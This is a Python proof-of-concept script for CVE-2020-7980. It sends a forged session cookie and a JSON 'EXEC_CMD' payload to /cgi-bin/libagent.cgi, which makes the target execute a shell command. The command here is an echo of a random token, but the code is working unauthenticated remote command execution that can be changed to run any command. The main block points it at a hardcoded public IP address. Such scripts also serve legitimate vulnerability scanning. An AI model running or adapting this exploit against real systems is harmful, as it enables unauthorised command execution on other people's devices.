#!/usr/bin/env python3

'''
name: CVE-2020-7980漏洞
description: CVE-2020-7980漏洞可执行任意命令
'''

import time
import string
import random
import calendar
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class CVE_2020_7980_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta='' 
        words=''.join((string.ascii_letters,string.digits))
        for i in range(8):
            self.capta = self.capta + random.choice(words)
        self.data = {
                    "O_":"A",
                    "V_":1,
                    "S_":123456789,
                    "F_":"EXEC_CMD",
                    "P1_":{
                        "F":"EXEC_CMD",
                        "Q":'echo %s' % (self.capta)
                        }
                    }

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            cmd_request = requests.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'}, allow_redirects = False, verify = False)
            if cmd_request.status_code == 200 and self.capta in cmd_request.text:
                result = cmd_request.text.split()[-2].replace('},', '')
                print("存在CVE-2020-7980漏洞,执行结果为:", result)
                return True
            else:
                print("不存在CVE-2020-7980漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2020_7980 = CVE_2020_7980_BaseVerify('http://185.23.98.50')
    CVE_2020_7980.run()